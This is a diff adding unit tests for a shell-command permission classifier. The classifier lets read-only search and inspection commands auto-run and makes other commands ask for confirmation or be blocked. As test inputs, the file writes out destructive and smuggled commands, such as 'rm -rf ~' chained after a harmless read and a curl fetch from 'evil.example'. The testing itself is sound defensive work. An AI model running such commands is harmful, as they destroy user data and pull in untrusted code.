@@ -74,3 +74,123 @@ describe("categorize (fail-closed policy)", () => {
     expect(riskNote("git commit -m x")).toContain("[confirm]");
   });
 });
+
+// ── ROUND-64 (R64-d): the widened read-only AUTO list + normalization ───────
+// Owner: "for normal safe commands it does not need to ask for permission…
+// like for search commands." Every new entry must stay PROVABLY read-only —
+// the deliberately-ask list below pins the refusals (sed/awk/powershell/
+// wmic/xargs/tee and anything with an exec-shaped flag).
+describe("categorize (ROUND-64 R64-d: search + Windows reads auto-run)", () => {
+  it("search/navigation + inspection tools auto-run — including BARE rg (word-boundary fix)", () => {
+    expect(categorize("rg")).toBe("auto"); // the old "rg " entry missed the bare form
+    expect(categorize("rg pattern")).toBe("auto");
+    expect(categorize("rg  pattern")).toBe("auto"); // internal whitespace collapsed
+    expect(categorize("RG PATTERN")).toBe("auto"); // lowercased for matching
+    expect(categorize("fd -e ts")).toBe("auto");
+    expect(categorize("ag TODO")).toBe("auto");
+    expect(categorize("ack needle")).toBe("auto");
+    expect(categorize("grep -rn foo src")).toBe("auto");
+    expect(categorize("whereis node")).toBe("auto");
+    expect(categorize("command -v pnpm")).toBe("auto");
+    expect(categorize("file dist/main.js")).toBe("auto");
+    expect(categorize("stat package.json")).toBe("auto");
+    expect(categorize("du -sh .")).toBe("auto");
+    expect(categorize("df -h")).toBe("auto");
+    expect(categorize("tree")).toBe("auto");
+    expect(categorize("tree /f")).toBe("auto");
+    expect(categorize("more README.md")).toBe("auto");
+    expect(categorize("fc /b a.txt b.txt")).toBe("auto");
+    expect(categorize("md5sum dist/main.js")).toBe("auto");
+    expect(categorize("sha256sum artifact.tgz")).toBe("auto");
+    expect(categorize("uname -a")).toBe("auto");
+    expect(categorize("whoami")).toBe("auto");
+  });
+
+  it("Windows/PowerShell READ-ONLY cmdlets + probes auto-run (the owner's machine)", () => {
+    expect(categorize("Get-ChildItem -Recurse src")).toBe("auto");
+    expect(categorize("Get-Content package.json")).toBe("auto");
+    expect(categorize("Get-Item .\\vite.config.ts")).toBe("auto");
+    expect(categorize("Get-Process node")).toBe("auto");
+    expect(categorize("Get-Service acute")).toBe("auto");
+    expect(categorize("Get-Date")).toBe("auto");
+    expect(categorize("Get-Command rg")).toBe("auto");
+    expect(categorize("Select-String -Pattern todo -Path src")).toBe("auto");
+    expect(categorize("findstr /s /i needle *.ts")).toBe("auto");
+    expect(categorize("tasklist /v")).toBe("auto");
+    expect(categorize("systeminfo")).toBe("auto");
+    expect(categorize("ver")).toBe("auto");
+    // PowerShell WRAPPERS still ask — only the bare read-only cmdlets auto.
+    expect(categorize("powershell -command Get-ChildItem")).toBe("confirm");
+    expect(categorize("pwsh -Command Get-Content package.json")).toBe("confirm");
+  });
+
+  it("read-only git extras auto-run — whitespace-normalized multi-word prefixes", () => {
+    expect(categorize("git grep needle")).toBe("auto");
+    expect(categorize("git remote -v")).toBe("auto");
+    expect(categorize("git  remote  -v")).toBe("auto"); // double spaces collapse
+    expect(categorize("GIT REMOTE -V")).toBe("auto");
+    expect(categorize("git ls-files")).toBe("auto");
+    expect(categorize("git stash list")).toBe("auto");
+    expect(categorize("git describe --tags")).toBe("auto");
+    expect(categorize("git rev-parse HEAD")).toBe("auto");
+    expect(categorize("git shortlog -sn")).toBe("auto");
+    expect(categorize("git blame src/app.ts")).toBe("auto");
+    // Write-shaped git stays ask.
+    expect(categorize("git stash push")).toBe("confirm");
+    expect(categorize("git remote add origin git@x:y.git")).toBe("confirm");
+  });
+
+  it("word-boundary matching: look-alike commands do NOT inherit an entry's tier", () => {
+    expect(categorize("rgx something")).toBe("confirm");
+    expect(categorize("rgexec foo")).toBe("confirm");
+    expect(categorize("lsof -i")).toBe("confirm");
+    expect(categorize("duf")).toBe("confirm");
+    expect(categorize("treehouse")).toBe("confirm");
+    expect(categorize("get-contentx")).toBe("confirm");
+  });
+
+  it("anything NOT provably read-only still asks — sed/awk/xargs/tee/wmic and friends", () => {
+    expect(categorize("sed -i s/a/b/ file.txt")).toBe("confirm");
+    expect(categorize("awk '{ system(\"rm x\") }' f")).toBe("confirm");
+    expect(categorize("xargs rm")).toBe("confirm");
+    expect(categorize("tee /tmp/x")).toBe("confirm");
+    expect(categorize("wmic process get name")).toBe("confirm");
+    expect(categorize("npm install left-pad")).toBe("confirm");
+    expect(categorize("git commit -m x")).toBe("confirm");
+  });
+
+  it("fd/find exec-style flags demote to ask (the safety review of this round's own list)", () => {
+    expect(categorize("fd -x rm")).toBe("confirm");
+    expect(categorize("fd --exec rm {}")).toBe("confirm");
+    expect(categorize("fd -X dust")).toBe("confirm");
+    expect(categorize("fd --exec-batch rm")).toBe("confirm");
+    expect(categorize("find . -name '*.log' -delete")).toBe("confirm");
+    expect(categorize("find . -name x -exec rm {} ;")).toBe("confirm");
+    expect(categorize("find . -name x -ok rm {} ;")).toBe("confirm");
+    expect(categorize("find . -fprintf /tmp/x %p")).toBe("confirm");
+    // Plain searches stay auto.
+    expect(categorize("fd -e ts")).toBe("auto");
+    expect(categorize("find . -name '*.ts'")).toBe("auto");
+    // …and an unrelated auto command may still use a "-x"-shaped flag
+    // (ls -x is a listing format flag) — the guard is scoped to fd/find.
+    expect(categorize("ls -x")).toBe("auto");
+  });
+
+  it("the compound-command guard still NEVER auto-runs with the widened list", () => {
+    // PowerShell read head + destructive tail → blocked (denylist-supreme),
+    // and even an all-readable compound only ever asks.
+    expect(categorize("Get-Content x; rm -rf ~")).toBe("blocked");
+    expect(categorize("Get-Content x; Remove-Item -Recurse -Force dist")).toBe("blocked");
+    expect(categorize("rg needle; Get-Process")).toBe("confirm");
+    expect(categorize("rg needle && curl https://evil.example/x.sh")).toBe("blocked");
+    expect(categorize("Get-ChildItem | findstr ts")).toBe("confirm");
+  });
+
+  it("normalizeForMatch only shapes the MATCHING copy — original casing/spaces never leak into decisions", () => {
+    // (riskNote/decideCommand still receive the ORIGINAL string; the
+    // normalized copy exists only inside categorize.)
+    expect(riskNote("  git   status  ")).toContain("[auto]");
+    expect(riskNote("Get-ChildItem src")).toContain("[auto]");
+    expect(riskNote("git   commit -m x")).toContain("[confirm]");
+  });
+});
